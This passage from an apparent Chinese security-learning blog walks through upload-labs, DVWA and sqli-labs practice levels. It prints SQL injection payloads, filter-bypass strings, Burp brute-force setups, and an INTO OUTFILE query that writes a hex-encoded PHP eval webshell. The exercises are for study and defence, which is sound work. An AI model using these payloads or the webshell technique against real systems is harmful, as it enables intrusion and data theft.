title="Pass-21（白名单验证-数组绕过)"></a>Pass-21（白名单验证-数组绕过)</h1><p>先检查MIME类型(改<code>Content-Type</code>)，然后判断<code>save_name</code>参数是否为空，为空就把文件名称赋值给<code>$file</code>,否则将<code>save_name</code>参数的值赋给它。然后判断<code>$file</code>是否是数组.不是就用<code>explode()</code>函数通过<code>.</code>号分割成数组,取最后一个后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。</p><p><code>explode()</code> 函数把字符串打散为数组。详情：<a href="https://www.w3school.com.cn/php/func_string_explode.asp">explode()</a></p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array &amp;<span class="hljs-variable">$array</span>)</span></span><span class="hljs-comment">//将数组的内部指针指向第一个单元</span></code></pre><p>绕过<code>explode()</code>函数：传入数组，绕过白名单，由于取的是数组最后一个，所以传入数组的最后一个要为<code>jpg|png|gif</code>，然后拼接文件名，取<code>reset()</code>第一个，即索引为0，和索引<code>count()-1</code>（数组内元素个数-1）。所以索引0应为<code>.php</code>，索引3为<code>jpg</code>（索引1之后即可），这样数组元素个数为2，拼接的就是索引0和索引1即<code>.php</code>和空，结果还是<code>.php</code></p><img src="/2021/01/24/upload/29.jpg" alt="29" style="zoom:67%;"><p>成功~~</p><img src="/2021/01/24/upload/28.jpg" alt="28" style="zoom:33%;"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>upload-labs</strong>靶场提供了许多绕过方式，但都较为简单的，实战中会遇到更复杂的绕过方式，有可能是多种验证并存，故思路不能局限，争取一关多解，其实这个靶场跟sqli-labs有相似之处，都是先逐个介绍各种验证方式，再逐步综合到一个关卡里。但解题过程把提示，源代码看得差不多了.……还过分依赖通关手册……要反思！！靶场还是很好玩的~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||SQL注入andSQL盲注</title>
    <link href="/2021/01/22/dvwa/"/>
    <url>/2021/01/22/dvwa/</url>
    
    <content type="html"><![CDATA[<h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>先挑熟悉的sql注入下手，单引号注入,报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</code>推测为单引号注入，查看源代码:</p><p><img src="/2021/01/22/dvwa/3.jpg" alt="3"></p><p>确定为单引号注入，源代码中用了<code>$_REQUEST获取id参数，$_REQUEST 包含了 $_GET，$_POST 和 $_COOKIE </code>的数组，没有进行过滤，开始查字段：</p><p><code>1&#39; order by 2#</code>回显正常:</p><p><img src="/2021/01/22/dvwa/4.jpg" alt="4"></p><p><code> 1&#39; order by 3#</code>显示<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>故有两个字段，接下来查回显位置<code>1&#39; union select 1,2# </code>:</p><p><img src="/2021/01/22/dvwa/2.jpg" alt="2"></p><p>有两个显示位。</p><p>查数据库:</p><p><code>1&#39; union select 1,database()#</code></p><p><img src="/2021/01/22/dvwa/5.jpg" alt="5"></p><p>查表:</p><p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>回显：<code>Illegal mix of collations for operation &#39;UNION&#39;</code>,百度的说法是字符集及数据表字段编码字符不一致导致的，不是很懂这条语句有什么编码问题，试试改为16进制读取：</p><p><code>1&#39; union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p><p><img src="/2021/01/22/dvwa/6.jpg" alt="6"></p><p><code>6775657374626F6F6B2C7573657273</code>hex解码后就是<code>guestbook,users</code></p><p>查列：</p><p><code>1&#39; union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name=&#39;users&#39; #</code></p><p><img src="/2021/01/22/dvwa/7.jpg" alt="7"></p><p>hex解码后为:<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p><p>查数据:</p><p><code>1&#39; union select user,password from users#</code>or<code>1&#39; union select 1,group_concat(user,0x3a,password) from users#</code>都可以</p><p><img src="/2021/01/22/dvwa/1.jpg" alt="1"></p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p><img src="/2021/01/22/dvwa/8.jpg" alt="8"></p><p>一打开就这样???去百度各种查，换PHP版本，改图示路径的代码……各种方法都试了，还是这个页面，又不想删掉重搭，然后就去虚拟机搭,虚拟机还不会用，搭个靶场搭了2小时……9(主要是找不到在虚拟机上用小皮面板搭dvwa的教程)各种报错，经历各种曲折终于搭好了</p><p><img src="/2021/01/22/dvwa/9.jpg" alt="9"></p><p>本关不能输入语句，查看源码，是POST提交，且使用<code>mysqli_real_escape_string()</code>(前两个靶场碰到很多次了，不再介绍)过滤,本关是POST方法提交表单故可以抓包修改参数。步骤不再赘述，要注意<strong>单引号会被转义，遇到union语句有单引号的可利用进制转换进行绕过</strong>。</p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>打开是一个链接，点开跳转到一个session页面，查看源码并没有什么过滤</p><img src="/2021/01/22/dvwa/10.jpg" alt="10" style="zoom:50%;"><p>high源码中，在session输入的id也不做处理，就相当于low的sql……</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p>查看源码</p><p><img src="/2021/01/22/dvwa/11.jpg" alt="11"></p><p>防止CSRF攻击</p><pre><code class="hljs pgsql">CSRF：跨站点请求伪造。CSRF攻击者在用户登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。应对CSRF的方法：    尽量使用POST，限制<span class="hljs-keyword">GET</span>    浏览器Cookie策略    加验证码    Referer <span class="hljs-keyword">Check</span>     Anti CSRF Token</code></pre><p>本关采用最后一种，至于<code>token</code>,在暴力破解的impossible等级我详细介绍过了。PS：貌似全面一点的防御都会用到<code>token</code></p><p>Token一般用在两个地方:</p><ul><li>防止表单重复提交：服务器端第一次验证相同过后,Token值会更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</li><li>anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</li></ul><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( <span class="hljs-variable">$data</span>-&gt;rowCount()</span></span> == <span class="hljs-number">1</span> ) <span class="hljs-comment">//限制了只允许返回一条数据</span></code></pre><p><img src="/2021/01/22/dvwa/12.jpg" alt="12"></p><p>PDO可以防止sql注入</p><ul><li>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。对于复杂的查询，此过程要花费较长的时间，如果需要以不同参数多次重复相同的查询，那么该过程将大大降低应用程序的速度。通过使用预处理语句，可以避免重复分析/编译/优化周 期。简言之，预处理语句占用更少的资源，因而运行得更快。</li><li>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</li></ul><p>详情见：<a href="https://www.cnblogs.com/leezhxing/p/5282437.html">PDO防SQL注入原理分析</a></p><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>试探</p><p><img src="/2021/01/22/dvwa/13.jpg" alt="13"></p><p>单引号注入，没有任何过滤，思路讲过了，也可以用sqlmap跑。</p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>POST型，抓包，F12都可，</p><p>源代码中用了<code>mysql_escape_string()</code>对单引号，双引号，反斜杠等过滤，碰到过滤的字符记得进制转换一下，步骤不再赘述。</p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>将操作页面和显示页面分开，将提交的值传递到显示页面的cookie字段中。</p><p>sql语句中增加了<code>limit 1</code>:限定了输出结果条数。</p><pre><code class="hljs angelscript"><span class="hljs-comment">// Might sleep a random amount</span>       <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;           sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );       &#125;</code></pre><p>随机执行sleep()函数，延迟的时间是随机在2-4s，这会时间盲注测试造成干扰，故本关可用布尔盲注。</p><h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><p><code>is_numeric()</code>限制数字查询,<code>Anti-CSRF token</code>防御,<code>PDO</code>防SQL注入,sql语句的<code>limit 1</code>这些家伙又出现了，不赘述辽~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Brute Force</title>
    <link href="/2020/12/26/dvwa%E4%BA%8C/"/>
    <url>/2020/12/26/dvwa%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><h3 id="暴力破解，查看源代码："><a href="#暴力破解，查看源代码：" class="headerlink" title="暴力破解，查看源代码："></a>暴力破解，查看源代码：</h3><p><img src="/2020/12/26/dvwa%E4%BA%8C/2.jpg" alt="2"></p><p>它的select语句没有什么过滤，可以尝试sql注入构造<code>admin&#39;#</code>密码为空：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/3.jpg" alt="3"></p><p>成功~~但这关标题为暴力破解，所以要按暴力破解做一遍：</p><p>抓包,发到intruder,先clear ，选中要爆破字段,添加：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/1.jpg" alt="1"></p><p>在payload中选择字典，读取（字典很大读取了好久）：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/5.jpg" alt="5"></p><p>可设置线程数也可以使用默认：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/6.jpg" alt="6"></p><p>上图是我设置的线程数（线程数主要是设置一些重试时间，开始时间，线程数量等数据），就然后就可以开始破解：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/4.jpg" alt="4"></p><p>length可以对响应包的长度进行排序，找最大或最小的值（<strong>响应报文不一样，密码正确和错误返回的不是同一个响应报文，其长度一般都不同，故找出不同的一项，就可以找出正确的一项</strong>)然后看这个HTTP请求的响应报文：</p><img src="/2020/12/26/dvwa%E4%BA%8C/8.jpg" alt="8" style="zoom:50%;"><p>报文中<code>welcome to the password protected area admin</code>表示成功登录。</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/9.jpg" alt="9"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>查看源码:</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/10.jpg" alt="10"></p><p>对传过来的值，使用了 <code>mysql_real_escape_string()</code> 函数，转义了以下字符：</p><pre><code class="hljs text">\x00 \n \r \ &#x27; &quot; \x1a</code></pre><p>还使用了sleep(2)在密码错误的时候延时两秒：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/11.jpg" alt="11"></p><p>与low等级类似，但转义了很多字符不能再用SQL注入，暴力破解与前面操作一样。</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>查看源码：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/22.jpg" alt="22"></p><p>发现登录验证时提交了username、password、login、user_token参数，服务器返回登陆页面时包含一个随机的user_token的值，每次登录时都要将user_token一起提交。服务器收到请求后，会先验证token，再进行sql查询。本关还使用了<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">stripslashes</a>函数（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个），<code> mysql_real_escape_string</code>对参数username、password进行过滤、转义,抵御sql注入。还是使用抓包，等学会python再用脚本做一遍。</p><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>burp suite 有四种攻击模式，之前讲到的抓包中都使用狙击手模式，因为只需爆破一个位置，本关需要两个爆破位置故选择草叉模式（草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合)关于攻击模式详细看教程：<a href="https://www.cnblogs.com/diligenceday/p/12316899.html">攻击模式</a></p><h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2020/12/26/dvwa%E4%BA%8C/12.jpg" alt="12"></h4><h4 id="设置线程"><a href="#设置线程" class="headerlink" title="设置线程"></a>设置线程</h4><p>因为草叉模式只允许单线程，故线程要设为一。</p><h4 id="设置options"><a href="#设置options" class="headerlink" title="设置options"></a>设置options</h4><p>Grep-Extract提取响应消息中的有用信息，添加设置：</p><img src="/2020/12/26/dvwa%E4%BA%8C/15.jpg" alt="15" style="zoom:50%;"><p>选中value值表示每次从响应中获得该值，将Redirections设置为Always。</p><h4 id="设置payloads"><a href="#设置payloads" class="headerlink" title="设置payloads"></a>设置payloads</h4><p>第一个参数不再赘述</p><img src="/2020/12/26/dvwa%E4%BA%8C/5-1610728925860.jpg" alt="5" style="zoom:50%;"><p>第二个参数</p><img src="/2020/12/26/dvwa%E4%BA%8C/14.jpg" alt="14" style="zoom:50%;"><p>红线部分为options中复制的token值。</p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p><img src="/2020/12/26/dvwa%E4%BA%8C/13.jpg" alt="13"></p><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p>这个源代码有点复杂：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/16.jpg" alt="16"></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/17.jpg" alt="17"><img src="/2020/12/26/dvwa%E4%BA%8C/18.jpg" alt="18"></p><p>本关一样有token值，但是两个级别最外层的爆破在通过字典尝试不同口令的时候，high只要发POST请求报文，就能从对应的响应报文拿到下次再发POST请求报文时需要用到的user_token。<strong>但impossible只有先发送GET方式的请求报文，才能获取到服务器发回来的一次性user_token。</strong>而GET方式的请求报文，无法提交爆破参数，只能通过POST方式的请求报文来提交爆破所用到的参数，所以需要在BurpSuite里建立一个宏来反复进行操作。</p><h4 id="建立宏"><a href="#建立宏" class="headerlink" title="建立宏"></a>建立宏</h4><p>直接对dvwa靶机的登录界面进行破解，在project options的sessions中添加Macros。</p><p>选择登录页面</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/19.jpg" alt="19"></p><p>选择token后定义参数</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/20.jpg" alt="20"></p><p>在configure item中添加</p><img src="/2020/12/26/dvwa%E4%BA%8C/21.jpg" alt="21" style="zoom:67%;"><p>添加规则时注意描述规则时要将其参数范围定义到所有网址，全局宏定义就结束了</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/23.jpg" alt="23"></p><p>接下来把提交的登录信息的包发送到入侵模块<strong>此时要选择post模式</strong></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/25.jpg" alt="25"></p><p>接下来跟high等级一样但攻击模式要选默认的狙击手模式</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/24.jpg" alt="24"></p><p>爆破成功~~</p><p>impossible和high级别的爆破涉及到登陆返回页面中产生的随机值user_token，在用户登录时要将user_token一起提交。由于user_token可提交报文的方式不同，high和impossible级别的爆破过程也不同。</p><p>至此dvwa的暴力破解就结束了~~</p><p>参考文献：<a href="https://zhuanlan.zhihu.com/p/126639909">DVWA教程之Brute Force（high、impossible）</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(七)</title>
    <link href="/2020/12/17/sqli-labs%E4%B8%83/"/>
    <url>/2020/12/17/sqli-labs%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h1><p>初看页面,考虑到二次注入，查看update的源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/1.jpg" alt="1"></p><p>数据需经函数处理，故不能进行二次注入，再查看login的代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/2.jpg" alt="2"></p><p>密码无函数处理，在密码进行注入<code>a&#39;;create table hi like users#</code></p><p>注入前：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/3.jpg" alt="3"></p><p>注入后:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/4.jpg" alt="4"></p><h1 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h1><p>在之前的MySQL里有介绍查询语句：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]</code>,而46关就与此相关。先看源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/5.jpg" alt="5"></p><p>发现这关使用sort代替id，并且为数字型注入，试改变sort的值：</p><img src="/2020/12/17/sqli-labs%E4%B8%83/6.jpg" alt="6" style="zoom:50%;"><p>在后接上asc(升序)或者desc(降序);</p><img src="/2020/12/17/sqli-labs%E4%B8%83/7.jpg" alt="7" style="zoom:50%;"><p>发现修改order by 后面的参数执行结果不同，推测注入点在<code>order by</code>后的参数中，查询官方文件：<a href="https://dev.mysql.com/doc/refman/8.0/en/select.html">MySQL</a></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/8.jpg" alt="8"></p><p>可利用order by 后参数进行注入。开始尝试：</p><h4 id="法一：报错注入"><a href="#法一：报错注入" class="headerlink" title="法一：报错注入"></a>法一：报错注入</h4><p><code>?sort=1 and updatexml(1,concat(0x7e,database()),1)</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/9.jpg" alt="9"></p><p>也可以用floor():</p><p><code>?sort=(select count(*) from information_schema.schemata group by concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/12.jpg" alt="12"></p><p>也可以用extractvalue():</p><p><code>and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/16.jpg" alt="16"></p><h4 id="法二：时间盲注"><a href="#法二：时间盲注" class="headerlink" title="法二：时间盲注"></a>法二：时间盲注</h4><p><code>and if(left(database(),8)=&#39;security&#39;,sleep(5),1)--+</code></p><img src="/2020/12/17/sqli-labs%E4%B8%83/10.jpg" alt="10" style="zoom:50%;"><p>但是我发现在错误的情况下，休眠时间超过5秒网页还会报错，在数据库里操作:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/11.jpg" alt="11" style="zoom:50%;"><p>好像挺正常的，可是在火狐里就是很诡异，有个说法是添加<code>sleep(N)</code>这个函数后，语句的执行具体会停留多长时间取决于<strong>满足条件的记录数</strong>，MySQL 会对<strong>每条</strong>满足条件的记录停留 N 秒钟，可如果因为这个的话，应该是延时很久，不至于网页报错啊。。。。。。</p><h4 id="法三：rand-函数"><a href="#法三：rand-函数" class="headerlink" title="法三：rand()函数"></a>法三：rand()函数</h4><p>格式：<code>?sort=rand(sql 语句)</code></p><p>rand(true):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/13.jpg" alt="13" style="zoom:50%;"><p>rand(flase):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/15.jpg" alt="15" style="zoom:50%;"><p><code>?sort=rand(left(database(),8)=&#39;security&#39;)</code>:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/14.jpg" alt="14" style="zoom:50%;"><p>页面和true一样，故该语句正确。</p><h4 id="法四-一句话木马"><a href="#法四-一句话木马" class="headerlink" title="法四:一句话木马"></a>法四:一句话木马</h4><p>先介绍一个语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lines terminated by 0x**&#x2F;&#x2F;每行输出以0x**结尾</span><br></pre></td></tr></table></figure><p>接下来要导文件，可能有人会遇到一样的问题，执行导文件命令后报错：The MySQL server is running with the –secure-file-priv option so it cannot execute，需到MySQL命令里查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/17.jpg" alt="17"></p><p>值为null,表示限制mysqld 不允许导入导出，需到MySQL配置文件里更改<code>secure_file_priv =</code>为空白</p><p>再查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/18.jpg" alt="18"></p><p>即可导出文件。 </p><p><code>?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sql\\less-46\\lll.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e --+</code>(<strong>0x一定要记得加，一开始忘记加一直报错。。。</strong>)</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/19.jpg" alt="19"></p><p>在目录里可找到如上文件，连接到蚁剑：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/20.jpg" alt="20"></p><p>47关单引号包裹其余相同，48关除了不报错其余也一样，49关单引号包裹无回显。</p><h1 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h1><p>查源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/21.jpg" alt="21"></p><p>用了mysqli_multi_query()函数：执行一个或多个针对数据库的查询。故可用堆叠注入：</p><p><code>?sort=1; create table hhh like users;</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/22.jpg" alt="22"></p><p>之前的方法仍适用,也可以堆叠方法构造一句话木马。51关单引号包裹其余相同。52关没有回显，其余与50关相同，53关单引号包裹也无回显，其余相同。</p><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>接下来是进阶学习，这一关主要考察字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。</p><p>盲猜单引号注入：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/23.jpg" alt="23"></p><p>查字段数：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/24.jpg" alt="24"></p><p>爆表:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/25.jpg" alt="25"></p><p>爆列：<img src="/2020/12/17/sqli-labs%E4%B8%83/26.jpg" alt="26"></p><p>爆值:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/27.jpg" alt="27"></p><p>输入密钥：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/28.jpg" alt="28"></p><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><p>这关有点奇葩我试了七次才试出闭合方式，居然是数字型的小括号包裹：</p><p><code>?id=1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/29.jpg" alt="29"></p><p>爆表：</p><p><code>?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/30.jpg" alt="30"></p><p>爆列：</p><p><code>?id=0） union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8dzw16d8m5&#39;--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/31.jpg" alt="31"></p><p>爆值：</p><p><code>?id=0) union select 1,2,group_concat(secret_97U6) from challenges.8dzw16d8m5--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/32.jpg" alt="32"></p><p>成功~~:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/33.jpg" alt="33"></p><p>56关为<code>&#39;)</code>包裹，57为双引号包裹。</p><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>在之前的关卡中报错都被注释，报错注入就不能使用，故前面的操作次数较多，而此关只有五次，查看源代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/34-1608353774465.jpg" alt="34"></p><p>报错没有被注释，故用报错注入。</p><p>单引号包裹：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/35.jpg" alt="35"></p><p>爆表：</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;) ),1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/36.jpg" alt="36"></p><p>爆列:</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where  table_name=&#39;933h2rr0c5&#39; )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/37.jpg" alt="37"></p><p>爆值：</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_GJ8R) from challenges.933h2rr0c5 )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/38.jpg" alt="38"></p><p>成功：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/39.jpg" alt="39"></p><p>59数字型注入，60<code>&quot;)</code>包裹，61关值得注意的是它是<code>&#39;))&#39;</code>包裹的，第一遍我试了四次才出来，这个故事告诉我们要打破前面关卡的固有思维。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（六）</title>
    <link href="/2020/12/14/sqli-labs%E5%85%AD/"/>
    <url>/2020/12/14/sqli-labs%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/2.jpg" alt="2"></p><p>这关额外注释了union,select,字符。</p><p>单引号报错，注释掉回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/1.jpg" alt="1"></p><h2 id="法一：联合查询"><a href="#法一：联合查询" class="headerlink" title="法一：联合查询"></a>法一：联合查询</h2><p>将union和select改为大小写混合就可以:</p><p><code>?id=0&#39;%0aUnIoN%0aSeLeCt%0a1,database(),2%0a%26%26%0a&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/3.jpg" alt="3"></p><p>不再赘述</p><h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><p><code>?id=1&#39;%a0||%a0updatexml(1,concat(0x7e,(database())),1) %a0||&#39;1&#39;=&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/4.jpg" alt="4"></p><h2 id="法三：布尔注入"><a href="#法三：布尔注入" class="headerlink" title="法三：布尔注入"></a>法三：布尔注入</h2><p><code>?id=1&#39;%0a%26%26%0aleft((select database()),8)=&#39;security&#39;%26%26&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/5.jpg" alt="5"></p><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>试探出双引号注入：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/6.jpg" alt="6"></p><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/7.jpg" alt="7"></p><p>注释报错，不能用报错注入，步骤类似，不再赘述。</p><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>单引号报错，单引号加括号也报错,将其分别注释：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/9.jpg" alt="9"></p><p>回显正常</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/10.jpg" alt="10"></p><p>回显正常？？将单引号闭合的id换掉：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/11.jpg" alt="11"></p><p>发现回显是id为1的用户，故判断为<code>&#39;)&#39;</code>注入。也可以用<code>;%00</code>注释可避免这个问题。</p><p>查源码：<img src="/2020/12/14/sqli-labs%E5%85%AD/8.jpg" alt="8"></p><p>少了 and和 or的注释，过滤了相连的<code>union</code>和<code>select</code>，正则表达式中\s表示匹配一个空格，也能匹配包括tab键等任意空白字符如制表符、换行符、空格等，因此%0a换行符也被匹配了，只能使用%a0来绕过，<code>/i</code>同时匹配大小写，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，  过滤了两次空格，过滤了<code>/</code>没过滤<code>\</code>，其余步骤类似：</p><p><code>?id=0&#39;)%a0uniOn%a0sElEct%a01,database(),3%a0or%a0(&#39;1&#39;)=(&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/12.jpg" alt="12"></p><p>不再赘述。</p><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/13.jpg" alt="13"></p><p>少了很多注释</p><p><code>?id=0&#39;) uniOn%a0sElEct 1,database(),3 or (&#39;1&#39;)=(&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/14.jpg" alt="14"></p><p>不再赘述</p><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>正常开始打，发现它与第1关一样，查了教程这一次29-32关在其他地方，同时还需要配置jspstudy环境,推荐教程：<a href="https://www.cnblogs.com/heiwa-0924/p/12369438.html">Less-29</a>,注意：<strong>jspstudy的端口问题，不与PHPstudy共用80，否则会冲突</strong>设置好变量后出现如下页面:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/15.jpg" alt="15"></p><p>补充知识:</p><h2 id="服务器（两层）架构"><a 